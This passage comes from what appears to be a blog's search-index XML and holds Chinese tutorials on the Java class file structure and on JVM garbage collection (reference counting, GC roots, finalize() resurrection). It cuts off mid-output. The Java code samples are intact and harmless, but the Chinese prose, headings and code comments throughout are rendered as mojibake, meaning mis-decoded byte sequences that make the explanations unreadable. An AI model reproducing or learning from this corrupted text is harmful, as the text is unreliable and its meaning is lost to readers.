ä¹‹å¤–ï¼Œæ‰€æœ‰çš„ Java ç±»éƒ½æœ‰çˆ¶ç±»ï¼Œå› æ­¤é™¤äº† java.lang.Object å¤–ï¼Œæ‰€æœ‰ Java ç±»çš„çˆ¶ç±»ç´¢å¼•éƒ½ä¸ä¸º 0ã€‚<strong>æ¥å£ç´¢å¼•é›†åˆ</strong>ç”¨æ¥æè¿°è¿™ä¸ªç±»å®ç°äº†é‚£äº›æ¥å£ï¼Œè¿™äº›è¢«å®ç°çš„æ¥å£å°†æŒ‰ implements (å¦‚æœè¿™ä¸ªç±»æœ¬èº«æ˜¯æ¥å£çš„è¯åˆ™æ˜¯extends) åçš„æ¥å£é¡ºåºä»å·¦åˆ°å³æ’åˆ—åœ¨æ¥å£ç´¢å¼•é›†åˆä¸­ã€‚</p><p>æ¥ç€å°±æ˜¯<strong>å­—æ®µè¡¨</strong>äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u2             fields_count;//å­—æ®µæ•°é‡</span><br><span class="line">field_info     fields[fields_count];//ä¸€ä¸ªç±»ä¼šå¯ä»¥æœ‰ä¸ªå­—æ®µ</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬è¿™é‡Œæ²¡æœ‰å£°æ˜ä»»ä½•å­—æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆç»™Mainç±»æ·»åŠ ä¸€ä¸ªå­—æ®µå†é‡æ–°åŠ è½½ä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> i++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> ++i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://pb01.s3.bitiful.net/134.png" alt="avatar"></p><ul><li><strong>access_flags:</strong> å­—æ®µçš„ä½œç”¨åŸŸï¼ˆpublic ,private,protectedä¿®é¥°ç¬¦ï¼‰ï¼Œæ˜¯å®ä¾‹å˜é‡è¿˜æ˜¯ç±»å˜é‡ï¼ˆstaticä¿®é¥°ç¬¦ï¼‰,å¯å¦è¢«åºåˆ—åŒ–ï¼ˆtransient ä¿®é¥°ç¬¦ï¼‰,å¯å˜æ€§ï¼ˆfinalï¼‰,å¯è§æ€§ï¼ˆvolatile ä¿®é¥°ç¬¦ï¼Œæ˜¯å¦å¼ºåˆ¶ä»ä¸»å†…å­˜è¯»å†™ï¼‰ã€‚</li><li><strong>name_index:</strong> å¯¹å¸¸é‡æ± çš„å¼•ç”¨ï¼Œè¡¨ç¤ºçš„å­—æ®µçš„åç§°ï¼›</li><li><strong>descriptor_index:</strong> å¯¹å¸¸é‡æ± çš„å¼•ç”¨ï¼Œè¡¨ç¤ºå­—æ®µå’Œæ–¹æ³•çš„æè¿°ç¬¦ï¼›</li><li><strong>attributes_count:</strong> ä¸€ä¸ªå­—æ®µè¿˜ä¼šæ‹¥æœ‰ä¸€äº›é¢å¤–çš„å±æ€§ï¼Œattributes_count å­˜æ”¾å±æ€§çš„ä¸ªæ•°ï¼›</li><li><strong>attributes[attributes_count]:</strong> å­˜æ”¾å…·ä½“å±æ€§å…·ä½“å†…å®¹ã€‚</li></ul><p>ä¸Šè¿°è¿™äº›ä¿¡æ¯ä¸­ï¼Œå„ä¸ªä¿®é¥°ç¬¦éƒ½æ˜¯å¸ƒå°”å€¼ï¼Œè¦ä¹ˆæœ‰æŸä¸ªä¿®é¥°ç¬¦ï¼Œè¦ä¹ˆæ²¡æœ‰ï¼Œå¾ˆé€‚åˆä½¿ç”¨æ ‡å¿—ä½æ¥è¡¨ç¤ºã€‚è€Œå­—æ®µå«ä»€ä¹ˆåå­—ã€å­—æ®µè¢«å®šä¹‰ä¸ºä»€ä¹ˆæ•°æ®ç±»å‹è¿™äº›éƒ½æ˜¯æ— æ³•å›ºå®šçš„ï¼Œåªèƒ½å¼•ç”¨å¸¸é‡æ± ä¸­å¸¸é‡æ¥æè¿°ã€‚</p><p>æ¥ç€å°±æ˜¯æˆ‘ä»¬çš„<strong>æ–¹æ³•è¡¨</strong>äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u2             methods_count;//æ–¹æ³•æ•°é‡</span><br><span class="line">method_info    methods[methods_count];//ä¸€ä¸ªç±»å¯ä»¥æœ‰ä¸ªå¤šä¸ªæ–¹æ³•</span><br></pre></td></tr></table></figure><p>methods_count è¡¨ç¤ºæ–¹æ³•çš„æ•°é‡ï¼Œè€Œ method_info è¡¨ç¤ºæ–¹æ³•è¡¨ã€‚</p><p>Class æ–‡ä»¶å­˜å‚¨æ ¼å¼ä¸­å¯¹æ–¹æ³•çš„æè¿°ä¸å¯¹å­—æ®µçš„æè¿°å‡ ä¹é‡‡ç”¨äº†å®Œå…¨ä¸€è‡´çš„æ–¹å¼ã€‚æ–¹æ³•è¡¨çš„ç»“æ„å¦‚åŒå­—æ®µè¡¨ä¸€æ ·ï¼Œä¾æ¬¡åŒ…æ‹¬äº†è®¿é—®æ ‡å¿—ã€åç§°ç´¢å¼•ã€æè¿°ç¬¦ç´¢å¼•ã€å±æ€§è¡¨é›†åˆå‡ é¡¹ã€‚</p><p><strong>method_info(æ–¹æ³•è¡¨çš„) ç»“æ„:</strong></p><p><img src="https://pb01.s3.bitiful.net/135.png" alt="avatar"></p><p>æœ€åï¼Œå°±æ˜¯<strong>å±æ€§è¡¨</strong>äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u2             attributes_count;//æ­¤ç±»çš„å±æ€§è¡¨ä¸­çš„å±æ€§æ•°</span><br><span class="line">attribute_info attributes[attributes_count];//å±æ€§è¡¨é›†åˆ</span><br></pre></td></tr></table></figure><p>åœ¨ Class æ–‡ä»¶ï¼Œå­—æ®µè¡¨ï¼Œæ–¹æ³•è¡¨ä¸­éƒ½å¯ä»¥æºå¸¦è‡ªå·±çš„å±æ€§è¡¨é›†åˆï¼Œä»¥ç”¨äºæè¿°æŸäº›åœºæ™¯ä¸“æœ‰çš„ä¿¡æ¯ã€‚ä¸ Class æ–‡ä»¶ä¸­å…¶å®ƒçš„æ•°æ®é¡¹ç›®è¦æ±‚çš„é¡ºåºã€é•¿åº¦å’Œå†…å®¹ä¸åŒï¼Œå±æ€§è¡¨é›†åˆçš„é™åˆ¶ç¨å¾®å®½æ¾ä¸€äº›ï¼Œä¸å†è¦æ±‚å„ä¸ªå±æ€§è¡¨å…·æœ‰ä¸¥æ ¼çš„é¡ºåºï¼Œå¹¶ä¸”åªè¦ä¸ä¸å·²æœ‰çš„å±æ€§åé‡å¤ï¼Œä»»ä½•äººå®ç°çš„ç¼–è¯‘å™¨éƒ½å¯ä»¥å‘å±æ€§è¡¨ä¸­å†™å…¥è‡ªå·±å®šä¹‰çš„å±æ€§ä¿¡æ¯ï¼ŒJava è™šæ‹Ÿæœºè¿è¡Œæ—¶ä¼šå¿½ç•¥æ‰å®ƒä¸è®¤è¯†çš„å±æ€§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVMåƒåœ¾å›æ”¶æœºåˆ¶</title>
      <link href="/2023/12/19/JVM2/"/>
      <url>/2023/12/19/JVM2/</url>
      
        <content type="html"><![CDATA[<h2 id="åƒåœ¾å›æ”¶æœºåˆ¶"><a href="#åƒåœ¾å›æ”¶æœºåˆ¶" class="headerlink" title="åƒåœ¾å›æ”¶æœºåˆ¶"></a>åƒåœ¾å›æ”¶æœºåˆ¶</h2><p>æˆ‘ä»¬å‰é¢æåˆ°ï¼ŒJavaä¼šè‡ªåŠ¨ç®¡ç†å’Œé‡Šæ”¾å†…å­˜ï¼Œå®ƒä¸åƒC/C++é‚£æ ·è¦æ±‚æˆ‘ä»¬æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼ŒJVMæä¾›äº†ä¸€å¥—å…¨è‡ªåŠ¨çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œå½“ä¸€ä¸ªJavaå¯¹è±¡ä¸å†ç”¨åˆ°æ—¶ï¼ŒJVMä¼šè‡ªåŠ¨å°†å…¶è¿›è¡Œå›æ”¶å¹¶é‡Šæ”¾å†…å­˜ï¼Œé‚£ä¹ˆå¯¹è±¡æ‰€å å†…å­˜åœ¨ä»€ä¹ˆæ—¶å€™è¢«å›æ”¶ï¼Œå¦‚ä½•åˆ¤å®šå¯¹è±¡å¯ä»¥è¢«å›æ”¶ï¼Œä»¥åŠå¦‚ä½•å»è¿›è¡Œå›æ”¶å·¥ä½œä¹Ÿæ˜¯JVMéœ€è¦å…³æ³¨çš„é—®é¢˜ã€‚</p><h3 id="å¯¹è±¡å­˜æ´»åˆ¤å®šç®—æ³•"><a href="#å¯¹è±¡å­˜æ´»åˆ¤å®šç®—æ³•" class="headerlink" title="å¯¹è±¡å­˜æ´»åˆ¤å®šç®—æ³•"></a>å¯¹è±¡å­˜æ´»åˆ¤å®šç®—æ³•</h3><p>é¦–å…ˆæˆ‘ä»¬æ¥å¥—è®¨è®ºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä¹Ÿå°±æ˜¯ï¼šå¯¹è±¡åœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥è¢«åˆ¤å®šä¸ºä¸å†ä½¿ç”¨å·²ç»å¯ä»¥å›æ”¶äº†ï¼Ÿè¿™é‡Œå°±éœ€è¦æåˆ°ä»¥ä¸‹å‡ ç§åƒåœ¾å›æ”¶ç®—æ³•äº†ã€‚</p><p><img src="https://pb01.s3.bitiful.net/108.png" alt="avatar"></p><h4 id="å¼•ç”¨è®¡æ•°æ³•"><a href="#å¼•ç”¨è®¡æ•°æ³•" class="headerlink" title="å¼•ç”¨è®¡æ•°æ³•"></a>å¼•ç”¨è®¡æ•°æ³•</h4><p>æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœæˆ‘ä»¬è¦ç»å¸¸æ“ä½œä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆé¦–å…ˆä¸€å®šä¼šåˆ›å»ºä¸€ä¸ªå¼•ç”¨å˜é‡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strå°±æ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹çš„å˜é‡ï¼Œå®ƒæŒæœ‰å¯¹åé¢å­—ç¬¦ä¸²å¯¹è±¡çš„å¼•ç”¨ï¼Œå¯ä»¥ä»£è¡¨åé¢è¿™ä¸ªå­—ç¬¦ä¸²å¯¹è±¡æœ¬èº«</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;lbwnb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//str.xxxxx...</span></span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œåªè¦ä¸€ä¸ªå¯¹è±¡è¿˜æœ‰ä½¿ç”¨ä»·å€¼ï¼Œæˆ‘ä»¬å°±ä¼šé€šè¿‡å®ƒçš„å¼•ç”¨å˜é‡æ¥è¿›è¡Œæ“ä½œï¼Œé‚£ä¹ˆå¯å¦è¿™æ ·åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦è¿˜éœ€è¦è¢«ä½¿ç”¨ï¼š</p><ul><li>æ¯ä¸ªå¯¹è±¡éƒ½åŒ…å«ä¸€ä¸ª <strong>å¼•ç”¨è®¡æ•°å™¨</strong>ï¼Œç”¨äºå­˜æ”¾å¼•ç”¨è®¡æ•°ï¼ˆå…¶å®å°±æ˜¯å­˜æ”¾è¢«å¼•ç”¨çš„æ¬¡æ•°ï¼‰</li><li>æ¯å½“æœ‰ä¸€ä¸ªåœ°æ–¹å¼•ç”¨æ­¤å¯¹è±¡æ—¶ï¼Œå¼•ç”¨è®¡æ•°<code>+1</code></li><li>å½“å¼•ç”¨å¤±æ•ˆï¼ˆ æ¯”å¦‚ç¦»å¼€äº†å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸæˆ–æ˜¯å¼•ç”¨è¢«è®¾å®šä¸º<code>null</code>ï¼‰æ—¶ï¼Œå¼•ç”¨è®¡æ•°<code>-1</code></li><li>å½“å¼•ç”¨è®¡æ•°ä¸º<code>0</code>æ—¶ï¼Œè¡¨ç¤ºæ­¤å¯¹è±¡ä¸å¯èƒ½å†è¢«ä½¿ç”¨ï¼Œå› ä¸ºè¿™æ—¶æˆ‘ä»¬å·²ç»æ²¡æœ‰ä»»ä½•æ–¹æ³•å¯ä»¥å¾—åˆ°æ­¤å¯¹è±¡çš„å¼•ç”¨äº†</li></ul><p>ä½†æ˜¯è¿™æ ·å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœä¸¤ä¸ªå¯¹è±¡ç›¸äº’å¼•ç”¨å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        <span class="type">Test</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line">        a.another = b;</span><br><span class="line">        b.another = a;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™é‡Œç›´æ¥æŠŠaå’Œbèµ‹å€¼ä¸ºnullï¼Œè¿™æ ·å‰é¢çš„ä¸¤ä¸ªå¯¹è±¡æˆ‘ä»¬ä¸å¯èƒ½å†å¾—åˆ°äº†</span></span><br><span class="line">        a = b = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        Test another;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§å¼•ç”¨è®¡æ•°ç®—æ³•ï¼Œé‚£ä¹ˆå½“å‡ºç°ä»¥ä¸Šæƒ…å†µæ—¶ï¼Œè™½ç„¶æˆ‘ä»¬æ— æ³•åœ¨å¾—åˆ°æ­¤å¯¹è±¡çš„å¼•ç”¨äº†ï¼Œå¹¶ä¸”æ­¤å¯¹è±¡æˆ‘ä»¬ä¹Ÿæ— éœ€å†ä½¿ç”¨ï¼Œä½†æ˜¯ç”±äºè¿™ä¸¤ä¸ªå¯¹è±¡ç›´æ¥å­˜åœ¨ç›¸äº’å¼•ç”¨çš„æƒ…å†µï¼Œé‚£ä¹ˆå¼•ç”¨è®¡æ•°å™¨çš„å€¼å°†ä¼šæ°¸è¿œæ˜¯<code>1</code>ï¼Œä½†æ˜¯å®é™…ä¸Šæ­¤å¯¹è±¡å·²ç»æ²¡æœ‰ä»»ä½•ç”¨é€”äº†ã€‚æ‰€ä»¥å¼•ç”¨è®¡æ•°æ³•å¹¶ä¸æ˜¯æœ€å¥½çš„è§£å†³æ–¹æ¡ˆã€‚</p><h4 id="å¯è¾¾æ€§åˆ†æç®—æ³•"><a href="#å¯è¾¾æ€§åˆ†æç®—æ³•" class="headerlink" title="å¯è¾¾æ€§åˆ†æç®—æ³•"></a>å¯è¾¾æ€§åˆ†æç®—æ³•</h4><p>ç›®å‰æ¯”è¾ƒä¸»æµçš„ç¼–ç¨‹è¯­è¨€ï¼ˆåŒ…æ‹¬Javaï¼‰ï¼Œä¸€èˆ¬éƒ½ä¼šä½¿ç”¨å¯è¾¾æ€§åˆ†æç®—æ³•æ¥åˆ¤æ–­å¯¹è±¡æ˜¯å¦å­˜æ´»ï¼Œå®ƒé‡‡ç”¨äº†ç±»ä¼¼äºæ ‘ç»“æ„çš„æœç´¢æœºåˆ¶ã€‚</p><p>é¦–å…ˆæ¯ä¸ªå¯¹è±¡çš„å¼•ç”¨éƒ½æœ‰æœºä¼šæˆä¸ºæ ‘çš„æ ¹èŠ‚ç‚¹ï¼ˆGC Rootsï¼‰ï¼Œå¯ä»¥è¢«é€‰å®šä½œä¸ºæ ¹èŠ‚ç‚¹æ¡ä»¶å¦‚ä¸‹ï¼š</p><ul><li>ä½äºè™šæ‹Ÿæœºæ ˆçš„æ ˆå¸§ä¸­çš„æœ¬åœ°å˜é‡è¡¨ä¸­æ‰€å¼•ç”¨åˆ°çš„å¯¹è±¡ï¼ˆå…¶å®å°±æ˜¯æˆ‘ä»¬æ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡ï¼‰åŒæ ·ä¹ŸåŒ…æ‹¬æœ¬åœ°æ–¹æ³•æ ˆä¸­JNIå¼•ç”¨çš„å¯¹è±¡ã€‚</li><li>ç±»çš„é™æ€æˆå‘˜å˜é‡å¼•ç”¨çš„å¯¹è±¡ã€‚</li><li>æ–¹æ³•åŒºä¸­ï¼Œå¸¸é‡æ± é‡Œé¢å¼•ç”¨çš„å¯¹è±¡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„<code>String</code>ç±»å‹å¯¹è±¡ã€‚</li><li>è¢«æ·»åŠ äº†é”çš„å¯¹è±¡ï¼ˆæ¯”å¦‚synchronizedå…³é”®å­—ï¼‰</li><li>è™šæ‹Ÿæœºå†…éƒ¨éœ€è¦ç”¨åˆ°çš„å¯¹è±¡ã€‚</li></ul><p><img src="https://pb01.s3.bitiful.net/109.png" alt="avatar"></p><p>ä¸€æ—¦å·²ç»å­˜åœ¨çš„æ ¹èŠ‚ç‚¹ä¸æ»¡è¶³å­˜åœ¨çš„æ¡ä»¶æ—¶ï¼Œé‚£ä¹ˆæ ¹èŠ‚ç‚¹ä¸å¯¹è±¡ä¹‹é—´çš„è¿æ¥å°†è¢«æ–­å¼€ã€‚æ­¤æ—¶è™½ç„¶å¯¹è±¡1ä»å­˜åœ¨å¯¹å…¶ä»–å¯¹è±¡çš„å¼•ç”¨ï¼Œä½†æ˜¯ç”±äºå…¶æ²¡æœ‰ä»»ä½•æ ¹èŠ‚ç‚¹å¼•ç”¨ï¼Œæ‰€ä»¥æ­¤å¯¹è±¡å³å¯è¢«åˆ¤å®šä¸ºä¸å†ä½¿ç”¨ã€‚æ¯”å¦‚æŸä¸ªæ–¹æ³•ä¸­çš„å±€éƒ¨å˜é‡å¼•ç”¨ï¼Œåœ¨æ–¹æ³•æ‰§è¡Œå®Œæˆè¿”å›ä¹‹åï¼š</p><p><img src="https://pb01.s3.bitiful.net/110.png" alt="avatar"></p><p>è¿™æ ·å°±èƒ½å¾ˆå¥½åœ°è§£å†³æˆ‘ä»¬åˆšåˆšæåˆ°çš„å¾ªç¯å¼•ç”¨é—®é¢˜ï¼Œæˆ‘ä»¬å†æ¥é‡ç°ä¸€ä¸‹å‡ºç°å¾ªç¯å¼•ç”¨çš„æƒ…å†µï¼š</p><p><img src="https://pb01.s3.bitiful.net/111.png" alt="avatar"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹è±¡1å’Œå¯¹è±¡2ä¾ç„¶æ˜¯å­˜åœ¨å¾ªç¯å¼•ç”¨çš„ï¼Œä½†æ˜¯åªæœ‰ä»–ä»¬å„è‡ªçš„GC Rootsæ–­å¼€ï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆä¸‹é¢è¿™æ ·ï¼š</p><p><img src="https://pb01.s3.bitiful.net/112.png" alt="avatar"></p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬æœ€åè¿›è¡Œä¸€ä¸‹æ€»ç»“ï¼šå¦‚æœæŸä¸ªå¯¹è±¡æ— æ³•åˆ°è¾¾ä»»ä½•GC Rootsï¼Œåˆ™è¯æ˜æ­¤å¯¹è±¡æ˜¯ä¸å¯èƒ½å†è¢«ä½¿ç”¨çš„ã€‚</p><h4 id="æœ€ç»ˆåˆ¤å®š"><a href="#æœ€ç»ˆåˆ¤å®š" class="headerlink" title="æœ€ç»ˆåˆ¤å®š"></a>æœ€ç»ˆåˆ¤å®š</h4><p>è™½ç„¶åœ¨ç»å†äº†å¯è¾¾æ€§åˆ†æç®—æ³•ä¹‹ååŸºæœ¬å¯èƒ½åˆ¤å®šå“ªäº›å¯¹è±¡èƒ½å¤Ÿè¢«å›æ”¶ï¼Œä½†æ˜¯å¹¶ä¸ä»£è¡¨æ­¤å¯¹è±¡ä¸€å®šä¼šè¢«å›æ”¶ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥åœ¨æœ€ç»ˆåˆ¤å®šé˜¶æ®µå¯¹å…¶è¿›è¡ŒæŒ½ç•™ã€‚</p><p>è¿˜è®°å¾—<code>Object</code>ç±»ä¸­çš„<code>finalize()</code>æ–¹æ³•å—ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Called by the garbage collector on an object when garbage collection</span></span><br><span class="line"><span class="comment"> * determines that there are no more references to the object.</span></span><br><span class="line"><span class="comment"> * A subclass overrides the &#123;<span class="doctag">@code</span> finalize&#125; method to dispose of</span></span><br><span class="line"><span class="comment"> * system resources or to perform other cleanup.</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123; &#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ–¹æ³•æ­£æ˜¯æœ€ç»ˆåˆ¤å®šæ–¹æ³•ï¼Œå¦‚æœå­ç±»é‡å†™äº†æ­¤æ–¹æ³•ï¼Œé‚£ä¹ˆå­ç±»å¯¹è±¡åœ¨è¢«åˆ¤å®šä¸ºå¯å›æ”¶æ—¶ï¼Œä¼šè¿›è¡ŒäºŒæ¬¡ç¡®è®¤ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œ<code>finalize()</code>æ–¹æ³•ï¼Œè€Œåœ¨æ­¤æ–¹æ³•ä¸­ï¼Œå½“å‰å¯¹è±¡æ˜¯å®Œå…¨æœ‰å¯èƒ½é‡æ–°å»ºç«‹GC Rootsçš„ï¼æ‰€ä»¥ï¼Œå¦‚æœåœ¨äºŒæ¬¡ç¡®è®¤åå¯¹è±¡ä¸æ»¡è¶³å¯å›æ”¶çš„æ¡ä»¶ï¼Œé‚£ä¹ˆæ­¤å¯¹è±¡ä¸ä¼šè¢«å›æ”¶ï¼Œå·§å¦™åœ°é€ƒè¿‡äº†åƒåœ¾å›æ”¶çš„å‘½è¿ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Test a;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        a = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™é‡Œç›´æ¥æŠŠaèµ‹å€¼ä¸ºnullï¼Œè¿™æ ·å‰é¢çš„å¯¹è±¡æˆ‘ä»¬ä¸å¯èƒ½å†å¾—åˆ°äº†</span></span><br><span class="line">        a  = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ‰‹åŠ¨ç”³è¯·æ‰§è¡Œåƒåœ¾å›æ”¶æ“ä½œï¼ˆæ³¨æ„åªæ˜¯ç”³è¯·ï¼Œå¹¶ä¸ä¸€å®šä¼šæ‰§è¡Œï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹éƒ½ä¼šæ‰§è¡Œï¼‰</span></span><br><span class="line">        System.gc();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç­‰å¾…åƒåœ¾</span></span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æˆ‘ä»¬æ¥çœ‹çœ‹aæœ‰æ²¡æœ‰è¢«å›æ”¶</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            System.out.println(<span class="built_in">this</span>+<span class="string">&quot; å¼€å§‹äº†å®ƒçš„æ•‘èµä¹‹è·¯ï¼&quot;</span>);</span><br><span class="line">            a = <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„<code>finalize()</code>æ–¹æ³•å¹¶ä¸æ˜¯åœ¨ä¸»çº¿ç¨‹è°ƒç”¨çš„ï¼Œè€Œæ˜¯è™šæ‹Ÿæœºè‡ªåŠ¨å»ºç«‹çš„ä¸€ä¸ªä½ä¼˜å…ˆçº§çš„<code>Finalizer</code>çº¿ç¨‹ï¼ˆæ­£æ˜¯å› ä¸ºä¼˜å…ˆçº§æ¯”è¾ƒä½ï¼Œæ‰€ä»¥å‰é¢æ‰éœ€è¦ç­‰å¾…1ç§’é’Ÿï¼‰è¿›è¡Œå¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥ç¨å¾®ä¿®æ”¹ä¸€ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(Thread.currentThread());</span><br><span class="line">        a = <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thread[Finalizer,8,system]</span><br><span 